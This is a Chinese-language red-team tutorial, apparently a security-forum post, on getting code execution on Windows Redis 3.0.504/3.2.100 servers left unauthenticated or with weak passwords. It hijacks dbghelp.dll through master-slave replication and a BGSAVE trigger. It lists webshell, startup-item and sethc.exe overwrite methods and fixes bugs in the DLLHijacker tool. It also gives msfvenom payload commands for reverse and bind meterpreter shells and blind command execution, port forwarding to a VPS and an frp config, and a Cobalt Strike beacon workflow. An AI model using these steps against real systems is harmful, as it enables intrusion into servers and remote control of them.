@@ -1,0 +1,181 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="0526219628316901f5c13b2119830f32">1.前言</h2>
+<p>大概两年前，一个红队项目打点进去后打不开局面，只拿到一些无关痛痒的成果，其中有几个Windows 3.0.504和3.2.100版本的Redis未授权访问或弱口令，我当时想，要是能通过Redis拿下其中一台Windows服务器就好了，我就有很多办法尝试横向了，于是搜索学习了很多关于Windows上Redis的利用。<br/>
+最近突然又想起了这个漏洞，而网上大部分师傅的文章都侧重于讲原理，并没有给出实战可用的方案，于是我写了这篇文章，比较偏红队实战。<br/>
+先说为什么不模块加载而要DLL劫持：</p>
+<ul>
+<li>3.x版本的Redis并没有模块加载的功能，而微软官方的Redis最高就到3.2.100和3.0.504，更高版本的Windows Redis都是第三方的，这也是实战中Windows服务器上的Redis几乎全是3.2.100和3.0.504的原因（可能我打体制单位比较多，或许部分私企尤其是互联网私企会用第三方的高版本Redis来获取一些新功能）。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000145-ee3bad90-1078-1.png"/><br/>
+当时大概搜到了以下这些办法：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>方式</th>
+<th>利用方法</th>
+<th>利用要求</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Webshell</td>
+<td>有IIS服务的情况下，可以尝试往<code>C:/inetpub/wwwroot/</code>写Webshell，其他Web服务要猜目录</td>
+<td>Administrator能直接写，普通用户看运气，Network Service权限写不了</td>
+</tr>
+<tr>
+<td>启动项</td>
+<td>比如往startup目录写启动项，但需要重启</td>
+<td>Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了</td>
+</tr>
+<tr>
+<td>覆写system32</td>
+<td>比如把cmd.exe覆写到sethc.exe，然后在RDP登录界面调出命令行窗口</td>
+<td>要System权限才能写</td>
+</tr>
+<tr>
+<td>加载模块</td>
+<td>4.x之后的Redis允许用户加载自定义dll，可用主从复制写入恶意DLL，直接加载执行</td>
+<td>无权限要求，但3.x的Redis并没有模块加载的功能</td>
+</tr>
+<tr>
+<td>DLL劫持</td>
+<td>劫持dbghelp.dll，主从复制写入恶意DLL并通过Redis命令触发</td>
+<td>无权限要求</td>
+</tr>
+<tr>
+<td>其他花式</td>
+<td>比如写一个exe马，再整个快捷方式伪装一下放到桌面上，等运维人员打开</td>
+<td>Administrator能直接写，普通用户需要猜用户名，Network Service权限写不了</td>
+</tr>
+</tbody>
+</table>
+<p>这些方法除了DLL劫持都要靠运气，只有DLL劫持能稳定利用并且对权限没有要求，也不会破坏原本的服务。</p>
+<h2 data-content="1" id="319f5f4a179cba6feb3ab027e0dd2fee">2.漏洞原理</h2>
+<p>不是这篇文章的重点，写得比较简略。</p>
+<h3 data-content="1" id="8bcf201bacec52c177e1a43302d70e9f">2.1 DLL劫持简介</h3>
+<p>DLL：Windows的动态链接库，简单来说，就是一部分Windows平台下的通用代码并没有写在程序里，而是当程序需要使用时去DLL里调用。<br/>
+DLL劫持：当程序没有指定DLL的绝对路径时，就会按一定顺序查找DLL，从而攻击者有机会在优先级更高的目录里放置恶意DLL。<br/>
+标准的DLL查找顺序：</p>
+<blockquote>
+<ol>
+<li>
+<strong>应用程序目录</strong>：首先，系统会在启动应用程序的目录中查找指定的 DLL 文件。</li>
+<li>
+<strong>系统目录</strong>：接下来，系统会在 Windows 系统目录中查找 DLL。系统目录通常是 <code>C:\Windows\System32</code>。</li>
+<li>
+<strong>16 位系统目录</strong>：然后，系统会在 16 位系统目录中查找，通常是 <code>C:\Windows\SysWOW64</code>。这一步主要是为了兼容性，用于在 64 位系统上运行 32 位应用程序。</li>
+<li>
+<strong>Windows 目录</strong>：接着是 Windows 的根目录，通常是 <code>C:\Windows</code>。</li>
+<li>
+<strong>当前工作目录</strong>：此后，系统会在当前工作目录中查找 DLL。这个目录是当前活动的目录，可能随着应用程序的运行而变化。</li>
+<li>
+<strong>系统环境变量指定的路径</strong>：最后，系统会按照在环境变量 <code>PATH</code> 中指定的顺序搜索 DLL。</li>
+</ol>
+</blockquote>
+<p>举例：</p>
+<blockquote>
+<p>例如，假设有一个应用程序叫做"example.exe"，它依赖于名为"example.dll"的动态链接库。而"example.exe"在加载"example.dll"时没有使用绝对路径，而是仅仅指定了DLL的名称。攻击者可以将恶意的"example.dll"文件放置在与"example.exe"相同的目录下，当"example.exe"启动时，系统会先在当前目录中查找"example.dll"文件，如果找到，就会加载该文件并执行其中的恶意代码。</p>
+</blockquote>
+<p>DLL劫持可以函数转发劫持也可以往完整DLL插入恶意代码，这里用的函数转发劫持，大致流程如下图所示：</p>
+<blockquote>
+<p><a href="https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/" target="_blank">https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/</a></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000339-32724438-1079-1.png"/></p>
+</blockquote>
+<h3 data-content="1" id="1d10853b7e1be9e7cc578799f83f7c07">2.2 劫持dbghelp.dll</h3>
+<p>redis-server.exe在执行bgsave时，会先在应用目录查找dbghelp.dll，找不到再去system32目录下找：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000401-3f40e9f8-1079-1.png"/><br/>
+而不管redis的权限是Administrator还是普通用户或者Network Service，它对自己的应用目录一定有写文件的权限，我们可以通过Redis的主从复制在应用目录里写入恶意DLL。</p>
+<h3 data-content="1" id="a6cde1a964a028115ac73b5c8f577046">2.3 函数转发劫持</h3>
+<p>对DLL进行函数转发劫持需要导出原本DLL的函数和地址，以保证程序通过恶意DLL调用这些函数时不影响正常功能，DLL的导出函数一般比较多，用Aheadlib之类的工具可以自动化处理。<br/>
+我这里用的是DLLHijacker：<a href="https://github.com/kiwings/DLLHijacker" target="_blank">https://github.com/kiwings/DLLHijacker</a><br/>
+它会自动处理导出表并生成一个VS2019的项目，但这个python脚本有几个bug：<br/>
+（1）VS项目中文乱码：<br/>
+修复：几个写文件的地方添加<code>encoding="utf-8"</code>。<br/>
+（2）函数导出表有匿名函数的时候，会导致<code>[-]Error occur: 'NoneType' object has no attribute 'decode'</code>：<br/>
+修复：在几个for循环里添加函数名是否为空的判断可以解决这个问题。<br/>
+（3）生成C/C++代码时，没有使用目标DLL的绝对路径，只是用了DLL的名字填充<code>LoadLibrary()</code>，这是一个很严重的bug，会导致函数转发失败、Redis的功能受到影响从而只能劫持一次：<br/>
+修复：我改成了根据输入的目标DLL路径自动填充。<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000527-72c396b8-1079-1.png"/><br/>
+如果没有使用原DLL的绝对路径，在Process Monitor可以看到，只会调用应用程序目录里的恶意DLL，并没有调用原本的system32下的dbghelp.dll：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000548-7f4870ca-1079-1.png"/><br/>
+从而redis的功能受到影响，导致redis的bgsave只能触发一次DLL调用，第二次bgsave的进程会被阻塞从而无法调用DLL，并且Redis关闭后将无法启动：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000600-86b86acc-1079-1.png"/><br/>
+这也是网上部分师傅的文章写”不会影响redis运行 但会无法重启“的原因，因为他们也是用的DLLHijacker，并且没有发现有这个坑，这不仅会影响业务，而且只能劫持一次：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000613-8e111f80-1079-1.png"/><br/>
+正常的DLL劫持不会影响程序的功能，可以劫持很多次，假如我第一次劫持想上线CS但是没有成功，那对面可能不出网，那我可能会再劫持打一个MSF的反向shell，都没成功我也可以继续尝试MSF盲打命令：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000627-96d03cbe-1079-1.png"/><br/>
+正常的DLL转发劫持如下，调用完应用程序目录里的恶意DLL后会调用原DLL：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000654-a6ee7d4a-1079-1.png"/></p>
+<h2 data-content="1" id="10e38becc88cea9d0b9514708f27807e">3.漏洞利用</h2>
+<h3 data-content="1" id="90ab9fe6a5602bb560dafe349b3ffe10">3.1 工具使用</h3>
+<p>工具下载地址：<a href="https://github.com/P4r4d1se/dll_hijack" target="_blank">https://github.com/P4r4d1se/dll_hijack</a><br/>
+如是是Windows 64位的Redis DLL劫持的话，可以直接用里面的VS2022版的dbghelp项目。<br/>
+其他要用我修改后的DllHijacker.py和目标DLL路径生成VS项目：<br/>
+<code>python3 DLLHijacker.py C:\Windows\System32\dbghelp.dll</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000717-b459066c-1079-1.png"/><br/>
+下载安装VS2022：<a href="https://visualstudio.microsoft.com/zh-hans/downloads" target="_blank">https://visualstudio.microsoft.com/zh-hans/downloads</a><br/>
+只用勾C++桌面开发：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000734-beaa9fd6-1079-1.png"/><br/>
+打开生成目录里的sln文件，因为原本是VS2019的项目所以会提醒你升级，选确定，不然得另外安装v142的编译组件才能编译VS2019的项目：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000745-c4d0ab08-1079-1.png"/><br/>
+打开后在源文件的dllmain.app，修改里面的shellocde就行，其他不用改：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000755-cabc468a-1079-1.png"/></p>
+<h3 data-content="1" id="a5bc3097a16ca5500bd973cc0581855b">3.2 出网——Cobalt Strike</h3>
+<p>如果Redis主机直接出网，或者能通其他已经上线CS的出网主机，那直接上CS是最好的选择，CS生成C语言的payload：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000808-d28d09ee-1079-1.png"/><br/>
+源文件的dllmain.app里把payload替换进去，然后选Release x64，生成——生成解决方案：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000833-e17bd8d6-1079-1.png"/><br/>
+然后主从复制将dbghelp.dll写过去并bgsave，我这里用的RabR而不是RedisWriteFile，因为这个可以自动备份并恢复Redis的数据，免得再自己用redis-dump-go：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000843-e7921348-1079-1.png"/><br/>
+上线成功：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000851-ec6b2ad0-1079-1.png"/></p>
+<h3 data-content="1" id="5367bb2fe465f0ceb62a68c6d9a1c640">3.3 不出网——Metasploit</h3>
+<h4 data-content="1" id="b91d58d4337d17a869f8f3c2bca9e624">3.3.1 反向shell</h4>
+<p>这里演示Redis主机不出网，但手里控了内网其他的Linux出网主机，通过端口转发来打反向shell，示意图：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000904-f405e2ee-1079-1.png"/><br/>
+msf生成payload，让meterpreter的流量指向Linux出网主机的4444端口：<br/>
+<code>msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 RC4PASSWORD=redis LHOST=192.168.115.128 LPORT=4444 -f c</code>：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000918-fc9d142c-1079-1.png"/><br/>
+Linux出网主机将本地4444端口映射到vps的8090端口：<code>./nb -tran 4444 vps_ip:8090</code>，这里用的工具是这个：<a href="https://github.com/cw1997/NATBypass" target="_blank">https://github.com/cw1997/NATBypass</a><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513000931-04870738-107a-1.png"/><br/>
+然后用frp把msf攻击机的4444端口映射到vps的8090：</p>
+<pre><code>serverAddr = "vps_ip"
+serverPort = vps_port
+
+[[proxies]]
+name = "test-tcp"
+type = "tcp"
+localIP = "127.0.0.1"
+localPort = 4444
+remotePort = 8090</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001009-1ae00ae8-107a-1.png"/><br/>
+msf启动监听，这里的LHOST可以用127.0.0.1或0.0.0.0都行：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001019-20bdf790-107a-1.png"/><br/>
+编译DLL+主从复制写入触发，msf成功收到shell：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001031-282b3e0c-107a-1.png"/></p>
+<h4 data-content="1" id="2ce7c53b54e783bf78cd69c717de591a">3.3.2 正向shell</h4>
+<p>也可以通过proxychains隧道让msf打一个正向shell，但我觉得不如用端口转发打反向，我这里是本地演示就不挂proxychains了：<br/>
+生成payload：<br/>
+<code>msfvenom -p windows/x64/meterpreter/bind_tcp_rc4 LPORT=11111 RC4PASSWORD=redis -f c</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001053-35636f04-107a-1.png"/><br/>
+然后编译DLL+主从复制写入触发，但这里有个问题，我测试的时候发现，rundll32.exe在win10防火墙上是默认只能出站不能入站的，我没有测试不同版本的Windows Server是否也是这样，如果默认都不能入站的话，那这个利用方式可能缺乏实战价值：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001106-3cbec42e-107a-1.png"/><br/>
+允许访问后，msf正向连接成功：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001118-43e069ec-107a-1.png"/></p>
+<h4 data-content="1" id="d5bf3beb53426d1389d759d4667fb516">3.3.3 exec</h4>
+<p>如果以上方法都不行，那就当成一个盲打的命令执行，结合具体情况想办法利用，就是过程稍微麻烦一点，每次执行命令都需要生成payload+编译DLL+主从复制写文件，不过这个过程也挺快的其实。<br/>
+msf生成Windows64位的命令执行payload：<br/>
+<code>msfvenom -p windows/x64/exec CMD="ping dnslog" -f c</code><br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001135-4e1e7d4a-107a-1.png"/><br/>
+编译DLL+主从复制触发：<br/>
+<img src="https://xzfile.aliyuncs.com/media/upload/picture/20240513001144-53c47b28-107a-1.png"/></p>
+<h2 data-content="1" id="5a2b71dac2ba41e25b6323076889bffe">4.参考</h2>
+<p><a href="https://chatgpt.com/" target="_blank">https://chatgpt.com/</a><br/>
+<a href="https://github.com/kiwings/DLLHijacker" target="_blank">https://github.com/kiwings/DLLHijacker</a><br/>
+<a href="https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html" target="_blank">https://cocomelonc.github.io/pentest/2021/10/12/dll-hijacking-2.html</a><br/>
+<a href="https://xz.aliyun.com/t/8153" target="_blank">https://xz.aliyun.com/t/8153</a><br/>
+<a href="https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/" target="_blank">https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/</a><br/>
+<a href="https://github.com/0671/RabR" target="_blank">https://github.com/0671/RabR</a></p>
+</div>
+</div>
